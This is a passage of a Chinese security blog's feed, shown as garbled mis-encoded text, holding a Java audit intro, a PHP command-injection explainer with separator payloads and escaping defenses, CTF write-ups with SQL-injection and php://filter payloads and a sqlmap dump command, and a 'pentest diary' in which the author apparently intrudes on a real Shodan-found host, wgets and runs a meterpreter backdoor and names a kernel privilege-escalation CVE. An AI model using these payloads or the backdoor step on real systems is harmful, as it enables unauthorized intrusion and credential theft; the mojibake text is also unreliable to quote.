é™¤ã€‚å½“ç„¶ï¼Œè¿™ä¹Ÿå¯èƒ½æ˜¯è¯¯æŠ¥ï¼Œéœ€è¦äººå·¥æ¥å†æ¬¡ç¡®è®¤ã€‚ä¸è¿‡ï¼Œè¿™å·²ç»ç»™æˆ‘ä»¬çš„å®¡è®¡å·¥ä½œå¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©äº†ï¼ˆã€‚ï¼¾â–½ï¼¾ï¼‰ã€‚</p><h2 id="æŠ“åŒ…æ”¹åŒ…"><a href="#æŠ“åŒ…æ”¹åŒ…" class="headerlink" title="æŠ“åŒ…æ”¹åŒ…"></a>æŠ“åŒ…æ”¹åŒ…</h2><p>åšJava Webå®¡è®¡æ—¶ï¼Œå¯èƒ½è¦ç»“åˆé»‘ç›’çš„æ–¹æ³•ï¼ŒåŠ¨æ€è°ƒè¯•ã€‚è¿™æ—¶å€™å°±éœ€è¦æŠ“åŒ…æ”¹åŒ…çš„å·¥å…·ï¼Œå‘é€è‡ªå®šä¹‰çš„HTTPåŒ…ã€‚è¿™ä¸ªåŠŸèƒ½å¾ˆå¤šå·¥å…·éƒ½æœ‰ï¼Œburpsuiteï¼Œzapï¼Œpostmanï¼Œfiddleréƒ½å¯ä»¥ç”¨ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ä»1å¼€å§‹çš„Javaä»£ç å®¡è®¡Â·åº</title>
      <link href="/2018/10/25/java-audit-step-by-step-0/"/>
      <url>/2018/10/25/java-audit-step-by-step-0/</url>
      
        <content type="html"><![CDATA[<p>å°ç»„ç»å¸¸æœ‰å°ä¼™ä¼´é—®æˆ‘<code>Java</code>è¯¥æ€ä¹ˆå®¡è®¡ï¼Œå…¶å®æˆ‘ä¹ŸæŒºå¤´å¤§çš„ã€‚å› ä¸ºæˆ‘è§‰å¾—å®¡<code>Java</code>çš„ä»£ç å’Œå®¡<code>PHP</code>çš„ä»£ç ï¼Œç›¸å·®ä¸å¤§ã€‚WEB æ¼æ´å°±é‚£äº›ï¼Œåªæ˜¯æ¢äº†é—¨è¯­è¨€å®ç°è€Œå·²ï¼Œåªè¦æ¼æ´åŸç†çŸ¥é“äº†ï¼Œå®¡èµ·æ¥æ˜¯å¾ˆå®¹æ˜“çš„ã€‚</p><p>å¾ˆå¤šå­¦å®‰å…¨çš„åŒå­¦ï¼Œåº”è¯¥æ˜¯ä»<code>PHP</code>å…¥é—¨çš„ã€‚<code>PHP</code>ä½œä¸ºä¸€é—¨è„šæœ¬è¯­è¨€ï¼Œè·¨å¹³å°ã€è¯­æ³•ç®€å•ã€æ˜“ä¸Šæ‰‹ã€å¼€æºæ¡†æ¶å¤šã€ç”¨æˆ·é‡å¤§ã€‚ä½†æ˜¯ï¼Œ<code>PHP</code>è¯­è¨€æœ¬èº«çš„ç‰¹æ€§ï¼Œå®ƒåœ¨åæœŸçš„æ‹“å±•å’Œç»´æŠ¤å›°éš¾ï¼Œè€Œä¸”æ”¯æŒæ‰€æœ‰æ¼æ´ï¼ˆæŠ–ä¸ªæœºçµï¼‰ã€‚å¾ˆå¤šå¯¹ç³»ç»Ÿç¨³å®šæ€§ã€å®‰å…¨æ€§è¦æ±‚è¾ƒé«˜çš„å‚å•†ä¸å¤ªä¼šå»é€‰æ‹©<code>PHP</code>ï¼Œè€Œæ˜¯<code>Java</code>æˆ–è€…åˆ«çš„è¯­è¨€ã€‚</p><p><code>Java</code>æ˜¯çº¯æ­£çš„é¢å‘å¯¹è±¡çš„è¯­è¨€ï¼Œé€‚åˆå›¢é˜Ÿåä½œå¼€å‘ï¼Œé‡æ„ã€ç»´æŠ¤ç›¸å¯¹è½»æ¾ï¼Œè¯­è¨€ç”Ÿæ€å¥½ï¼Œä¸”åœ¨é«˜æ€§èƒ½ã€é«˜å¹¶å‘ã€åˆ†å¸ƒå¼çš„åœºæ™¯åŠæ‰“æŸè¯­è¨€ã€‚ï¼ˆè™½ç„¶<code>PHP</code>ä¹Ÿæ˜¯æ”¯æŒé¢å‘å¯¹è±¡çš„å†™æ³•ï¼Œä¸è¿‡èº«è¾¹çœŸçš„åœ¨ç”¨é¢å‘å¯¹è±¡çš„æ–¹æ³•å†™<code>PHP</code>çš„åŒå­¦çœŸçš„å¾ˆå°‘ï¼Œå¯èƒ½æ˜¯ä¸å¤ªç†è§£é¢å‘å¯¹è±¡çš„æ¦‚å¿µï¼Œä¹Ÿå¯èƒ½æ˜¯å› ä¸ºå†™èµ·æ¥ä»£ç å¤ªé•¿äº†ï¼Ÿï¼‰</p><p>ç›®å‰ï¼Œç½‘ä¸Šå…³äº WEB ä»£ç å®¡è®¡çš„æ–‡ç« å¾ˆå¤šéƒ½æ˜¯<code>PHP</code>çš„ï¼Œå’Œ<code>Java</code>ç›¸å…³çš„å¾ˆå°‘ï¼Œè€Œä¸”è´¨é‡ä¸€èˆ¬ã€‚æ‰€ä»¥æˆ‘æ‰“ç®—åšä¸€ä¸ª<code>Java</code>ä»£ç å®¡è®¡çš„ç³»åˆ—ï¼Œåˆ†äº«<code>Java</code>ä»£ç å®¡è®¡ç›¸å…³çš„å°å§¿åŠ¿ã€‚</p><p>åœ¨è¿™ä¸ªç³»åˆ—é‡Œï¼Œæˆ‘å‡è®¾æ¯ä¸ªè¯»è€…éƒ½å¯¹ Java å’Œ WEB å®‰å…¨æ–¹é¢çš„çŸ¥è¯†éƒ½æœ‰ä¸€å®šçš„äº†è§£ï¼Œæ‰€ä»¥å¯èƒ½ä¸ä¼šå¯¹æ¼æ´çš„åŸç†åšå¾ˆæ·±çš„åˆ†æã€‚</p><p>å¦‚æœä½ è§‰å¾—çœ‹èµ·æ¥æœ‰äº›ç´¯ï¼Œæˆ–è€…å¯¹æŸä¸ªæ¼æ´ä¸ç†è§£ï¼Œå»ºè®®å…ˆå»æ‰¾äº›ç›¸å…³èµ„æ–™å­¦ä¹ ä¸‹ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ¸—é€æ—¥è®°-20181005</title>
      <link href="/2018/10/05/pentest-20181005/"/>
      <url>/2018/10/05/pentest-20181005/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ shodan ä¸Šæœåˆ°ä¸€ä¸ªæœ‰è¶£çš„ç«™ï¼Œåå­—å°±å« webshellã€‚</p><p><img src="/2018/10/05/pentest-20181005/1.png" alt="1"></p><p>æ ¹æ®æç¤º</p><blockquote><p>Nothing specify params. Try to use â€œ?file=â€ or â€œ?id=timeâ€ to read a stream.</p></blockquote><p>å¯ä»¥é€šè¿‡ file å‚æ•°è¯»å–æ–‡ä»¶å†…å®¹ã€‚</p><p>å°è¯•è¯»å– /etc/passwd æˆåŠŸã€‚</p><a id="more"></a><p><img src="/2018/10/05/pentest-20181005/2.png" alt="2"></p><p>å°è¯•æ‰§è¡Œå‘½ä»¤ï¼Œ<code>a;ls</code>ï¼ŒæˆåŠŸã€‚</p><p><img src="/2018/10/05/pentest-20181005/3.png" alt="3"></p><p>ä½†æ˜¯ä½†æˆ‘å°è¯•è¯»å–ä¸Šçº§ç›®å½•çš„æ—¶å€™ï¼Œ<code>a;ls ..</code>ï¼Œå¤±è´¥ã€‚</p><p><img src="/2018/10/05/pentest-20181005/4.png" alt="4"></p><p>å°è¯•äº†å¾ˆå¤šæ–¹æ³•ï¼Œæœ€åå‘ç°ï¼Œå¯èƒ½æ˜¯ç©ºæ ¼å¤±æ•ˆäº†ã€‚</p><p>æ‰¾åˆ° l3m0n å¸ˆå‚…çš„å‘½ä»¤æ‰§è¡Œç»•è¿‡æŠ€å·§ï¼Œå°è¯• <code>&lt;&gt;</code> <code>${IFS}</code> æ›¿ä»£ç©ºæ ¼ã€‚</p><p>æ‰§è¡ŒæˆåŠŸã€‚</p><p><img src="/2018/10/05/pentest-20181005/5.png" alt="5"></p><p>æ¥ä¸‹æ¥ï¼Œå°±å¯ä»¥å¼¹ä¸€ä¸ªshellå›æ¥ï¼Œç„¶åä¸ºæ‰€æ¬²ä¸ºå•¦ã€‚ ï¼ˆã€‚ï¼¾â–½ï¼¾ï¼‰</p><p>ä¸è¿‡æˆ‘å–œæ¬¢ç”¨ msf ï¼Œé‚£å°±å…ˆåœ¨è‡ªå·±æœåŠ¡å™¨çš„ web ç›®å½•å†™ä¸€ä¸ª meterpreter çš„åé—¨ã€‚</p><p>å† wget ä¸‹æ¥åè¿è¡Œã€‚</p><p><img src="/2018/10/05/pentest-20181005/6.png" alt="6"></p><p><img src="/2018/10/05/pentest-20181005/7.png" alt="7"></p><p>æˆåŠŸè¿ä¸Šã€‚</p><p><img src="/2018/10/05/pentest-20181005/8.png" alt="8"></p><p>Ubuntu 16.04 å†…æ ¸ <code>4.4.0-77</code>ï¼Œ<code>CVE-2017-16995</code> åº”è¯¥å¯ä»¥ç›´æ¥ææƒï¼Œä¸è¿‡æ˜¯å›½å†…çš„æœºå™¨ï¼Œä¹Ÿæ²¡ä»€ä¹ˆå¤ªå¤šæœ‰æ„æ€çš„ä¸œè¥¿ï¼Œå°±ä¸æ·±å…¥äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHPä¸­çš„å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2018/09/18/summary-command-execution/"/>
      <url>/2018/09/18/summary-command-execution/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ PHP ä¸­, <code>exec()</code>ã€<code>system()</code>ã€<code>popen()</code>ã€<code>passthru()</code>ã€<code>proc_open()</code>ã€<code>pcntl_exec()</code>ã€<code>shell_exec()</code>ï¼Œè¿˜æœ‰åå¼•å· ``åŒ…è£¹çš„å†…å®¹ï¼Œéƒ½å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>å¦‚æœæ‰§è¡Œçš„å‘½ä»¤å‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><p>ä¸‹é¢æ˜¯å¸¸è§çš„å‡½æ•°æè¿°ï¼š</p><ul><li><p>system()</p><p>  è¾“å‡ºå¹¶è¿”å›æœ€åä¸€è¡Œshellç»“æœã€‚ </p></li><li><p>exec()</p><p>  ä¸è¾“å‡ºç»“æœï¼Œè¿”å›æœ€åä¸€è¡Œshellç»“æœï¼Œæ‰€æœ‰ç»“æœå¯ä»¥ä¿å­˜åˆ°ä¸€ä¸ªè¿”å›çš„æ•°ç»„é‡Œé¢ã€‚</p></li><li><p>passthru()</p><p>  åªè°ƒç”¨å‘½ä»¤ï¼ŒæŠŠå‘½ä»¤çš„è¿è¡Œç»“æœåŸæ ·åœ°ç›´æ¥è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šã€‚</p></li><li><p>popen()ã€proc_open()</p><p>  ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆã€‚</p></li><li><p>åå¼•å·</p><p>  è°ƒç”¨ <code>shell_exec()</code> å‡½æ•°</p></li></ul><a id="more"></a><hr><h2 id="å„å¹³å°çš„æ¼æ´åˆ©ç”¨"><a href="#å„å¹³å°çš„æ¼æ´åˆ©ç”¨" class="headerlink" title="å„å¹³å°çš„æ¼æ´åˆ©ç”¨"></a>å„å¹³å°çš„æ¼æ´åˆ©ç”¨</h2><p>åœ¨å®é™…åœºæ™¯ä¸­ï¼Œè¦åˆ©ç”¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œé€šå¸¸éœ€è¦å€ŸåŠ©ç®¡é“ç¬¦ï¼Œæ‹¼æ¥åˆ°æ­£å¸¸çš„å‘½ä»¤å‚æ•°ä¸­æ¥å®ç°ã€‚</p><p>å„ä¸ªå¹³å°æ”¯æŒçš„ç®¡é“ç¬¦éƒ½æœ‰æ‰€ä¸åŒï¼Œä¸‹é¢æ˜¯ <code>Windows</code> åŠ <code>Linux</code> æ”¯æŒçš„ç®¡é“ç¬¦ã€‚</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li><p>|</p><p>  ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><blockquote><p>ping | whoami</p></blockquote></li><li><p>||</p><p>  å¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><blockquote><p>p || whoami</p></blockquote></li><li><p>\&amp;</p><p>  å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ï¼Œç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><p>  ä¸ºçœŸï¼Œä¹Ÿä¼šæ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><blockquote><p>ping 127.0.0.1 &amp; whoami</p></blockquote></li><li><p>\&amp;\&amp;</p><p>  å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ç›´æ¥å‡ºé”™ï¼Œä¸ä¼šæ‰§è¡Œåé¢çš„ã€‚å‰é¢çš„è¯­å¥å¿…é¡»ä¸ºçœŸã€‚</p><blockquote><p>ping 127.0.0.1 &amp;&amp; whoami</p></blockquote></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li><p>\;</p><p>  æ‰§è¡Œå®Œå‰é¢çš„è¯­å¥ï¼Œå†æ‰§è¡Œåé¢çš„ã€‚</p><blockquote><p>ping 127.0.0.1;whoami</p></blockquote></li><li><p>|</p><p>  ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><blockquote><p>ping | whoami</p></blockquote></li><li><p>||</p><p>  å¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><blockquote><p>p || whoami</p></blockquote></li><li><p>\&amp;</p><p>  å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ï¼Œç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><p>  ä¸ºçœŸï¼Œä¹Ÿä¼šæ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><blockquote><p>ping 127.0.0.1 &amp; whoami</p></blockquote></li><li><p>\&amp;\&amp;</p><p>  å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ç›´æ¥å‡ºé”™ï¼Œä¸ä¼šæ‰§è¡Œåé¢çš„ã€‚å‰é¢çš„è¯­å¥å¿…é¡»ä¸ºçœŸã€‚</p><blockquote><p>ping 127.0.0.1 &amp;&amp; whoami</p></blockquote></li></ul><hr><h2 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h2><p>PHP å†…ç½®äº†ä¸¤ä¸ªå‡½æ•°ï¼Œ<code>escapeshellarg()</code>ï¼Œ<code>escapeshellcmd()</code>å¯ä»¥é˜²æ­¢å‘½ä»¤æ‰§è¡Œã€‚</p><ol><li><p>escapeshellarg()</p><p> æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°ã€‚</p></li><li><p>escapeshellcmd()</p><p> shell å…ƒå­—ç¬¦è½¬ä¹‰ã€‚</p><p> å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° <code>exec()</code> æˆ– <code>system()</code> å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p><p> åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A å’Œ \xFFã€‚ â€˜ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>iæ˜¥ç§‹-Web-BLOG</title>
      <link href="/2018/09/11/ichunqiu-web-BLOG/"/>
      <url>/2018/09/11/ichunqiu-web-BLOG/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ä¸ªBLOGï¼Œæ³¨å†Œåç™»å½•ï¼Œå‘ç°ä½¿ç”¨äº† <code>kindeditor 4.1.10</code> ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªç¼–è¾‘å™¨å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œè®¿é—® <code>/kindeditor/php/file_manager_json.php?path=../</code>ï¼Œä¼šæ³„éœ²ç›®å½•å†…æ–‡ä»¶ã€‚</p><a id="more"></a><p><img src="/2018/09/11/ichunqiu-web-BLOG/kindeditor.png" alt="kindeditor"></p><p>å‘ç° <code>flag</code> å°±åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œä½†æ˜¯æ²¡åŠæ³•è®¿é—®åˆ°ã€‚</p><p>ç»§ç»­æ‘¸ç´¢ï¼Œæœ‰ä¸ªå‘æ–‡ç« çš„åŠŸèƒ½ï¼Œå­˜åœ¨SQLæ³¨å…¥ï¼ŒINSERTå‹ã€‚</p><p>é€šè¿‡INSERTå¯ä»¥æ‰¹é‡æ·»åŠ è®°å½•çš„ç‰¹æ€§ï¼Œåˆ¤æ–­å‡ºå½“å‰è¡¨å­˜åœ¨4ä¸ªå­—æ®µã€‚</p><p>Payload:</p><blockquote><p>title=1&amp;content=1â€™,â€™1â€™),(â€˜aaaâ€™,â€™bbbâ€™,â€™cccâ€™) # æŠ¥é”™<br>title=1&amp;content=1â€™,â€™1â€™),(â€˜aaaâ€™,â€™bbbâ€™,â€™cccâ€™,â€™dddâ€™) # æˆåŠŸ</p></blockquote><p>æ ¹æ®å›æ˜¾ï¼Œå¾—å‡ºç¬¬äºŒä¸ªå­—æ®µæ˜¯æ ‡é¢˜ï¼Œç¬¬ä¸‰ä¸ªå­—æ®µæ˜¯å†…å®¹ã€‚</p><p>å¼€å§‹çˆ†æ•°æ®ï¼š</p><ul><li><p>çˆ†è¡¨å</p><blockquote><p>title=1&amp;content=1â€™,â€™1â€™),(â€˜aaaâ€™,(select group_concat(table_name) from information_schema.tables where table_schema = database()),â€™cccâ€™,â€™dddâ€™) # å¾—åˆ°è¡¨ [posts,users]</p></blockquote></li><li><p>çˆ†å­—æ®µ</p><blockquote><p>title=1&amp;content=1â€™,â€™1â€™),(â€˜aaaâ€™,(select table_name, column_name from information_schema.columns where table_name = â€˜usersâ€™ # å¾—åˆ°ä¸¤ä¸ªå­—æ®µ [username,password]</p></blockquote></li><li><p>çˆ†ç”¨æˆ·</p><blockquote><p>title=1&amp;content=1â€™,â€™1â€™),(â€˜aaaâ€™,(select group_concat(username) from users ),â€™cccâ€™,â€™dddâ€™) # å¾—åˆ°ç”¨æˆ·å admin </p></blockquote></li><li><p>çˆ†å¯†ç </p><blockquote><p>title=1&amp;content=1â€™,â€™1â€™),(â€˜aaaâ€™,(select group_concat(password) from users ),â€™cccâ€™,â€™dddâ€™) # å¾—åˆ°å¯†ç HASH dbb616c5d935d8f34c12c291066d6fb7ï¼Œè§£å¯†å melody123</p></blockquote></li></ul><p>é‡æ–°ä»¥ <code>admin</code> èº«ä»½ç™»å½•ï¼Œå‘ç°æ–°çš„å…¥å£ <code>/blog_manage/manager.php?module=article_manage&amp;name=php</code>ï¼Œçœ‹é“¾æ¥ï¼Œé•¿å¾—å°±åƒæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p>æµ‹è¯•åï¼Œå‘ç°ç¡®å®æ˜¯è¿™ä¸ªé—®é¢˜ã€‚</p><p>æ„é€ é“¾æ¥ï¼Œ <code>/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code>ï¼ŒæˆåŠŸè¯»åˆ° <code>flag</code>ã€‚</p><p><img src="/2018/09/11/ichunqiu-web-BLOG/flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> iæ˜¥ç§‹ </tag>
            
            <tag> BLOG </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>iæ˜¥ç§‹-Web-SQLi</title>
      <link href="/2018/09/10/ichunqiu-web-SQLi/"/>
      <url>/2018/09/10/ichunqiu-web-SQLi/</url>
      
        <content type="html"><![CDATA[<p>ä¸€é“æ³¨å…¥é¢˜ï¼Œç™»å½•é¡µé¢ã€‚</p><p>è¯•äº†å¸¸è§çš„ä¸‡èƒ½å¯†ç ï¼Œæ— æ•ˆï¼Œä¸å­˜åœ¨å¼±å£ä»¤ã€‚</p><p>ä½¿ç”¨BPï¼Œçœ‹ä¸‹è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ã€‚</p><a id="more"></a><p><img src="/2018/09/10/ichunqiu-web-SQLi/bp-1.png" alt="BP-1"></p><p>å‘ç°å‚æ•°å«æœ‰<code>%</code>æ—¶ï¼ŒæŠ¥é”™ã€‚</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-1.png" alt="SQLi-1"></p><p>æç¤º <code>Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18</code>ï¼Œæ ¹æ®æç¤ºï¼Œåˆ¤å®šå¯èƒ½å­˜åœ¨<code>sprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</code>ã€‚</p><p>çœ‹ä¸‹<code>sprintf</code>å‡½æ•°çš„æè¿°ã€‚</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/info-1.png" alt="Info-1"></p><p>å¯ä»¥æ„é€ payload:<code>admin %1$&#39; or 1=1 #</code>ï¼Œé¡¶æ‰å ä½ç¬¦ï¼Œæ³¨å…¥sqlè¯­å¥ã€‚æ­¤å¤„ï¼Œæç¤º<code>password error!</code></p><p>æ­¤å¤„ä¸å›æ˜¾å†…å®¹ï¼Œä½†æ˜¯æœ‰é”™è¯¯æç¤ºï¼Œåªèƒ½ç›²æ³¨ã€‚</p><p>å¯ä»¥ç›´æ¥ç”¨<code>sqlmap</code>è·‘å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://b968f913d88e4ce5b916d5f6a2badf2e4568f7626bc84863.game.ichunqiu.com/&quot; --data &quot;username=admin%1$&apos; * #&amp;password=12345&quot; --no-cast -p username --level 3 -T B -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-2.png" alt="SQLi-2"></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.colabug.com/4099484.html" target="_blank" rel="noopener">phpä¸­åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç»•è¿‡addslashesæ³¨å…¥</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SQLi </tag>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ—¥å¸¸å¿ƒè·¯-180909</title>
      <link href="/2018/09/09/daily-life-20180909/"/>
      <url>/2018/09/09/daily-life-20180909/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å¿™äº†å¾ˆå¤šäº‹ï¼Œä»å…¬å¸ç¦»èŒï¼Œæ¬å®¶ï¼Œå¼€å­¦ï¼Œåˆè·‘åˆ°æŸå¸‚åšåŸ¹è®­ã€‚</p><p>çªç„¶å›åˆ°æ ¡å›­ç”Ÿæ´»ï¼Œèº«ä»½ä»ç¤¾ä¼šäººå˜æˆå­¦ç”Ÿï¼Œæ„Ÿè§‰è¿˜æœ‰ç‚¹ä¸é€‚åº”ã€‚</p><p>ä»Šå¤©ï¼Œå¦‚æ„¿ä»¥å¿çš„é€šè¿‡äº†<code>Syclover</code>çš„é¢è¯•ï¼Œè¿›å…¥äº†æ–°èŠ½ç»„ï¼Œåº”è¯¥æ˜¯å”¯ä¸€ä¸€ä¸ªå¤§ä¸‰çš„æ–°èŠ½ ( â•¯â–¡â•° )ï¼Œä¸è¿‡ä¹Ÿç®—æ˜¯å®Œæˆäº†é«˜ä¸­æ—¶å€™çš„å¿ƒæ„¿ï¼ˆè¿›å…¥CUITï¼Œè¿›å…¥Sycloverï¼‰ã€‚ä»Šå¤©é¢çš„å¸ˆå‚…å¾ˆä¸¥è‚ƒï¼Œæ„Ÿè§‰è‡ªå·±ç¡®å®è¿˜å·®çš„å¤ªå¤šäº†ï¼Œå¸Œæœ›èƒ½åœ¨è¿™ä¸ªå­¦æœŸåŠªåŠ›è·Ÿä¸Šã€‚</p><p>è¿™ä¸ªå­¦æœŸï¼Œéœ€è¦é¢å¤–è¡¥<code>3</code>é—¨è¯¾ï¼ŒæŠŠå››çº§è¿‡äº†ï¼Œè¿˜è¦å°½é‡é€šè¿‡æ ¸å¿ƒç»„é¢è¯•ï¼Œä»»åŠ¡æŒºé‡çš„âŠ™ï¹âŠ™âˆ¥ã€‚</p><p>è¯¸å›å…±å‹‰å§(ï¾‰*ï½¥Ï‰ï½¥)ï¾‰ã€‚</p><p><img src="/2018/09/09/daily-life-20180909/jldnydhgjxzpmdzj.jpg" alt="è¡¨æƒ…"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ—¥å¸¸ </tag>
            
            <tag> å¿ƒè·¯ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>çˆ¬è™«ä¹‹æ‰¹é‡ä¸‹è½½Admin5æºç </title>
      <link href="/2018/08/01/crawl-admin5/"/>
      <url>/2018/08/01/crawl-admin5/</url>
      
        <content type="html"><![CDATA[<h2 id="é¡¹ç›®ä»‹ç»"><a href="#é¡¹ç›®ä»‹ç»" class="headerlink" title="é¡¹ç›®ä»‹ç»"></a>é¡¹ç›®ä»‹ç»</h2><p><a href="http://down.admin5.com" target="_blank" rel="noopener"><code>Admin5</code></a> æä¾›äº†å„ç§è¯­è¨€çš„å¼€æºé¡¹ç›®ï¼ŒåŒ…æ‹¬<code>asp</code> <code>php</code> <code>.net</code> <code>jsp</code>ç­‰ã€‚æœ€è¿‘å¼€å§‹ç©ä»£ç å®¡è®¡ï¼Œåˆ°å¤„æ‰¾é¡¹ç›®å¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥æ‰“ç®—å†™ä¸€ä¸ªçˆ¬è™«ï¼Œå€ŸåŠ©Admin5æ‰¹é‡ä¸‹è½½å„ç±»å¼€æºé¡¹ç›®ã€‚</p><a id="more"></a><h2 id="åˆ†æé¡µé¢"><a href="#åˆ†æé¡µé¢" class="headerlink" title="åˆ†æé¡µé¢"></a>åˆ†æé¡µé¢</h2><p>é¦–å…ˆï¼Œåˆ†æä¸‹<code>Admin5</code>çš„é¡µé¢ã€‚</p><p><img src="/2018/08/01/crawl-admin5/screenshot-1.png" alt="æˆªå›¾-1"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé¡µé¢æ•°æ®ç›´æ¥åœ¨htmlä¸­æ˜¾ç¤ºçš„ï¼Œå¹¶ä¸æ˜¯JSæ¸²æŸ“ä¸Šå»çš„ï¼Œè¿™å°±æ¯”è¾ƒå¥½çˆ¬äº†ã€‚åœ¨å“åº”çš„è¯·æ±‚ä¸­ï¼Œé¡µé¢ç”¨çš„æ˜¯<code>gb2312</code>ç¼–ç ï¼Œæ‰“å°çš„æ—¶å€™éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œä¸ç„¶ä¼šä¹±ç ã€‚å»ºè®®è®¾ç½®ç¼–ç ä¸º<code>gbk</code>ï¼Œå› ä¸º<code>gb2312</code>çš„æ”¯æŒçš„å­—æ²¡æœ‰<code>gbk</code>å¤šï¼Œåƒæ‰“å°<code>å›§</code>çš„æ—¶å€™ï¼Œå°±ä¼šæŠ›å¼‚å¸¸ã€‚</p><p>é¦–é¡µçš„åœ°å€æ˜¯<code>http://down.admin5.com/php/</code>ï¼Œå¾€åç¿»é¡µï¼Œå†çœ‹çœ‹é¦–é¡µçš„åœ°å€ã€‚</p><p><img src="/2018/08/01/crawl-admin5/screenshot-2.png" 